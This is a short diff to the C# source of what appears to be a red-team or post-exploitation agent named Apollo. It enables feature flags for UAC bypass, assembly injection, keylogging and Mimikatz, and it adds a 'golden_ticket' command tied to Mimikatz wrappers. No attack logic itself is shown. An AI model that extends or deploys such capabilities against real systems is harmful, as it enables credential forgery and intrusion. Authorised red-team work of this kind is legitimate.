@@ -1,4 +1,4 @@
-﻿#define COMMAND_NAME_UPPER
+#define COMMAND_NAME_UPPER
 
 #if DEBUG
 #undef BYPASSUAC
@@ -21,6 +21,8 @@
 #define ASSEMBLY_INJECT
 #undef EXECUTE_ASSEMBLY
 #define EXECUTE_ASSEMBLY
+#undef GOLDEN_TICKET
+#define GOLDEN_TICKET
 #undef KEYLOG
 #define KEYLOG
 #undef LIST_ASSEMBLIES
@@ -131,6 +133,11 @@
 #define LIST_INJECTION_TECHNIQUES
 
 #endif
+
+#if GOLDEN_TICKET && !(MAKE_TOKEN && MIMIKATZ)
+#error GOLDEN_TICKET requires on MAKE_TOKEN and MIMIKATZ
+#endif
+
 using System.Collections.Generic;
 using Newtonsoft.Json;
 using System;
@@ -298,6 +305,9 @@ namespace Apollo
 #if JOBKILL
 
                 { "jobkill", "Jobs" },
+#endif
+#if GOLDEN_TICKET
+                { "golden_ticket", "MimikatzWrappers" },
 #endif
 #if KEYLOG
                 { "keylog", "Keylog" },
